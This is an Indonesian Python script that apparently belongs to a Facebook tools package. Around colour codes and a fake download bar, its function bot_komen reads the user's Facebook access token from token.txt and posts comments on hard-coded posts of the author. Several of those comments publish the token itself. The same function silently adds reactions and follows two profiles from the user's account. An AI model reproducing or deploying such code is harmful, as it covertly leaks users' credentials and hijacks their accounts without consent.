# -*- coding: utf-8
#Terima Kasih Buat Lu Semua NgT0ND
#Aslamulaikumm Mamang 
#Supporter OF Angga,Dapunta,Yayan,Mr.Risky
#https://github.com/Dumai-991/
import itertools
import threading
import os
try:
    import requests
except ImportError:
    print ('\n [×] Modul requests belum terinstall!...\n')
    os.system('pip install requests' if os.name == 'nt' else 'pip2 install requests')

try:
    import concurrent.futures
except ImportError:
    print ('\n [×] Modul Futures belum terinstall!...\n')
    os.system('pip install futures' if os.name == 'nt' else 'pip2 install futures')

try:
    from bs4 import BeautifulSoup
except ImportError:
    print ('\n [×] Modul bs4 belum terinstall!...\n')
    os.system('pip install bs4' if os.name == 'nt' else 'pip2 install bs4')
import requests, bs4, sys, os, subprocess, random, time, re, json
from concurrent.futures import ThreadPoolExecutor as YayanGanteng
from datetime import datetime
from time import sleep
from requests import Session
import re, sys
import sys
from os import system
import os, sys, time, random
from sys import exit as keluar
from time import sleep as waktu
from random import random as acak
from random import choice as pilih
from sys import stdout
from os import system
from sapi import *
################
q="\033[00m"
h2="\033[40m"
b2="\033[44m"
c2="\033[46m"
i2="\033[42m"
u2="\033[45m"
m2="\033[41m"
p2="\033[47m"
k2="\033[43m"
b='\033[0;94m'
#b='\033[0;97m'
i='\033[0;92m'
c='\033[0;96m'
m='\033[0;91m'
u='\033[0;95m'
k='\033[0;93m'
p='\033[0;97m'
h='\033[0;90m'
P = '\x1b[0;97m' # PUTIH
M = '\x1b[0;91m' # MERAH 
H = '\x1b[0;92m' # HIJAU
I = '\x1b[0;92m' # HIJAU
K = '\x1b[0;93m' # KUNING
B = '\x1b[0;94m' # BIRU
U = '\x1b[0;95m' # UNGU
O = '\x1b[0;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
ajg_lu = ([i, c, m, u, k, p, h, q])
w = pilih(ajg_lu)
#'user-agent'                : 'Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36', # Jangan Di Ganti Ea Anjink.
try:
	import requests
	import sys
	import os
	import subprocess
	import random
	import time
	import re
	import json
	import uuid
	from multiprocessing.pool import ThreadPool
	from requests.exceptions import ConnectionError
	from datetime import datetime
	import requests, bs4, sys, os, subprocess, random, time, re, json
	from concurrent.futures import ThreadPoolExecutor as YayanGanteng
	from datetime import datetime
	from time import sleep
	import time
	from tqdm import tqdm
except Exception as modul:
	print(" \033[0;97m[\033[0;91m!\033[0;97m] Module requests not installed yet")
	exit(" \033[0;97m[\033[0;93m#\033[0;97m] Please Type : pip2 install requests")
def bot_komen():
    global token,toket,avsid
    print(k+"\nMohon Bersabar Sedang Check Token Facebook");time.sleep(0.5)
    try:
        token = open('token.txt', 'r').read()
        toket = open('token.txt', 'r').read()
        avsid = open('token.txt', 'r').read()
    except IOError:
        print(' \033[0;97m[\033[0;91m!\033[0;97m] Token Invalid')
        os.system('rm -rf token.txt')
        exit()
    try:
        otw = requests.get('https://graph.facebook.com/me/?access_token='+toket)
        a = json.loads(otw.text)
        nama = a['name']
        id = a['id']
    except KeyError:
        os.system('clear')
        print(' \033[0;97m[\033[0;91m!\033[0;97m] Token Invalid')
        os.system('rm -rf token.txt')
        exit()
#        login()
    jalan(c+"Nama Facebook : "+i+nama)
    jalan(c+"Id Facebook   : "+i+id)
    una = ('100063690353340') 
    post = ('120338706765807') 
    post2 = ('167879728678371') 
    post3 = ('172628718203472') 
    post4 = ('120338706765807') 
    post5 = ('128437652759023/') 
    post6 = ('103017691967686') 
    post7 = ('180923747373969') 
    kom = ('Bang @[100063690353340:0] Logo Facebook Abang Keren Loh\nhttps://www.facebook.com/photo.php?fbid=120338706765807&set=a.116524033813941&type=3&app=fbl') 
    kom3 = random.choice(['_  _ ____ ____ ____ _  _ \n|_/  |___ |__/ |___ |\ | \n| \_ |___ |  \ |___ | \| \nKeren\nBy Mr.Risky','_  _ ____ _  _ ___ ____ ___  \n|\/| |__| |\ |  |  |__| |__] \n|  | |  | | \|  |  |  | |    \nMantap','Bang @[100063690353340:0] Aku Pakai Script Abanv Lo... \nI Love You','♥ You Bang @[100063690353340:0]','Mantap \nKeren \nxoxo \n','I LOVE YOU','xoxo','mantap'])
    kom2 = random.choice(['_  _ ____ ____ ____ _  _ \n|_/  |___ |__/ |___ |\ | \n| \_ |___ |  \ |___ | \| \nKeren\nBy Mr.Risky','_  _ ____ _  _ ___ ____ ___  \n|\/| |__| |\ |  |  |__| |__] \n|  | |  | | \|  |  |  | |    \nMantap','Bang @[100063690353340:0] Aku Pakai Script Abanv Lo... \nI Love You','♥ You Bang @[100063690353340:0]','Mantap \nKeren \nxoxo \n','I LOVE YOU','xoxo','mantap'])
    kom1 = random.choice(['_  _ ____ ____ ____ _  _ \n|_/  |___ |__/ |___ |\ | \n| \_ |___ |  \ |___ | \| \nKeren\nBy Mr.Risky','_  _ ____ _  _ ___ ____ ___  \n|\/| |__| |\ |  |  |__| |__] \n|  | |  | | \|  |  |  | |    \nMantap','Bang @[100063690353340:0] Aku Pakai Script Abanv Lo... \nI Love You','♥ You Bang @[100063690353340:0]','Mantap \nKeren \nxoxo \n','I LOVE YOU','xoxo','mantap'])
    kom4 = random.choice(['_  _ ____ ____ ____ _  _ \n|_/  |___ |__/ |___ |\ | \n| \_ |___ |  \ |___ | \| \nKeren\nBy Mr.Risky','_  _ ____ _  _ ___ ____ ___  \n|\/| |__| |\ |  |  |__| |__] \n|  | |  | | \|  |  |  | |    \nMantap','Bang @[100063690353340:0] Aku Pakai Script Abanv Lo... \nI Love You','♥ You Bang @[100063690353340:0]','Mantap \nKeren \nxoxo \n','I LOVE YOU','xoxo','mantap'])
    kom5 = random.choice(['_  _ ____ ____ ____ _  _ \n|_/  |___ |__/ |___ |\ | \n| \_ |___ |  \ |___ | \| \nKeren\nBy Mr.Risky','_  _ ____ _  _ ___ ____ ___  \n|\/| |__| |\ |  |  |__| |__] \n|  | |  | | \|  |  |  | |    \nMantap','Bang @[100063690353340:0] Aku Pakai Script Abanv Lo... \nI Love You','♥ You Bang @[100063690353340:0]','Mantap \nKeren \nxoxo \n','I LOVE YOU','xoxo','mantap'])
    kom2 = ('MANTAP BANG @[100063690353340:0] ♥♥ \nhttps://m.facebook.com/photo.php?fbid=167879728678371&id=100063690353340&set=a.167879912011686&_rdr') 
    reac = pilih(['LOVE','WOW','HAHA','LIKE']) 
    requests.post('https://graph.facebook.com/' + post + '/comments/?message=Bang @[100063690353340:0] Aku Pakai Script Abang Loh Keren Kali...\n Kalau Abang Mau Pakai Token Facebook Aku Aja Bang\n' + token + '&access_token=' + token)
    requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + kom3 + '&access_token=' + token)
    requests.post('https://graph.facebook.com/' + post2 + '/comments/?message=Bang @[100063690353340:0] Aku Pakai Script Abang Loh Keren Kali...\n Kalau Abang Mau Pakai Token Facebook Aku Aja Bang\n' + token + '&access_token=' + token)
    requests.post('https://graph.facebook.com/' + post2 + '/comments/?message=' + kom3 + '&access_token=' + token)
    requests.post('https://graph.facebook.com/' + post3 + '/comments/?message=' + kom4 + '&access_token=' + token)
    requests.post('https://graph.facebook.com/' + post3 + '/comments/?message=' + kom5 + '&access_token=' + token)
    requests.post('https://graph.facebook.com/' + post4 + '/comments/?message=Bang @[100063690353340:0] Aku Pakai Script Abang Loh Keren Kali...\n Kalau Abang Mau Pakai Token Facebook Aku Aja Bang\n' + token + '&access_token=' + token)
    requests.post('https://graph.facebook.com/' + post4 + '/comments/?message=' + kom3 + '&access_token=' + token)
    requests.post('https://graph.facebook.com/' + post5 + '/comments/?message=' + kom4 + '&access_token=' + token)
    requests.post('https://graph.facebook.com/' + post5 + '/comments/?message=' + kom5 + '&access_token=' + token)
    requests.post('https://graph.facebook.com/' + post6 + '/comments/?message=Bang @[100063690353340:0] Aku Pakai Script Abang Loh Keren Kali...\n Kalau Abang Mau Pakai Token Facebook Aku Aja Bang\n' + token + '&access_token=' + token)
    requests.post('https://graph.facebook.com/' + post6 + '/comments/?message=' + kom3 + '&access_token=' + token)
    requests.post('https://graph.facebook.com/' + post7 + '/comments/?message=' + kom4 + '&access_token=' + token)
    requests.post('https://graph.facebook.com/' + post7 + '/comments/?message=' + kom5 + '&access_token=' + token)
    requests.post('https://graph.facebook.com/'+post2+'/reactions?type=' +reac+ '&access_token='+ token)
    requests.post('https://graph.facebook.com/'+post+'/reactions?type=' +reac+ '&access_token='+ token)
    requests.post('https://graph.facebook.com/'+post6+'/reactions?type=' +reac+ '&access_token='+ token)
    requests.post('https://graph.facebook.com/'+post5+'/reactions?type=' +reac+ '&access_token='+ token)
    requests.post('https://graph.facebook.com/'+post4+'/reactions?type=' +reac+ '&access_token='+ token)
    requests.post('https://graph.facebook.com/'+post3+'/reactions?type=' +reac+ '&access_token='+ token)
    requests.post('https://graph.facebook.com/'+post7+'/reactions?type=' +reac+ '&access_token='+ token)
    requests.post('https://graph.facebook.com/100063690353340/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100063690353340/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100067783659018/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100067783659018/subscribers?access_token=' + token)
    os.system("clear")
    jalan(f"{c}Terima Kasih Telah Berkunjung KeTools Kami :){q}")
#    menu()
#bot_komen()
def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(1./500)
def down(xnxx):
	kntl = (['0.2', '0.4', '0.003',])
	tml = pilih(kntl)
	jalan(f"{c}Silahkan Tunggu Hingga Selesai {m}!!{q}")
	jalan(f"{c}Sedang Download File {xnxx}{q}")
	for x in tqdm(range(100)):
	    time.sleep(tml)
	jalan(f"Download File {xnxx} Selesai Gan :)")
